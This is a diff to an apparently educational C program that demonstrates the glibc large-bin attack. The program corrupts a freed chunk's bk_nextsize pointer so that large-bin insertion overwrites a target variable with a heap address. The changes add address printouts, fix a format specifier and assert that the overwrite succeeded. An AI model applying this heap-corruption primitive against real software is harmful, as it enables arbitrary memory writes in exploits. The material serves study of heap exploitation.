@@ -1,5 +1,6 @@
 #include<stdio.h>
 #include<stdlib.h>
+#include<assert.h>
 
 /*
 
@@ -38,7 +39,7 @@ int main(){
   printf("====================================================================\n\n");
 
   size_t target = 0;
-  printf("Here is the target we want to overwrite (%p) : %llu\n\n",&target,target);
+  printf("Here is the target we want to overwrite (%p) : %lu\n\n",&target,target);
   size_t *p1 = malloc(0x428);
   printf("First, we allocate a large chunk [p1] (%p)\n",p1-2);
   size_t *g1 = malloc(0x18);
@@ -74,18 +75,20 @@ int main(){
   printf("\n");
 
   size_t *g4 = malloc(0x438);
-  printf("Finally, allocate another chunk larger than [p2] to place [p2] into large bin\n");
+  printf("Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n", p2-2, p2-2);
   printf("Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
   printf("  the modified p1->bk_nextsize does not trigger any error\n");
-  printf("Upon inserting [p2] into largebin, [p1]->bk_nextsize->fd->nexsize is overwritten to address of [p2]\n");
+  printf("Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd->nexsize is overwritten to address of [p2] (%p)\n", p2-2, p1-2, p2-2);
 
   printf("\n");
 
-  printf("In out case here, target is now overwritten to address of [p2]\n",target);
+  printf("In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n", p2-2, (void *)target);
   printf("Target (%p) : %p\n",&target,(size_t*)target);
 
   printf("\n");
   printf("====================================================================\n\n");
+
+  assert((size_t)(p2-2) == target);
 
   return 0;
 }
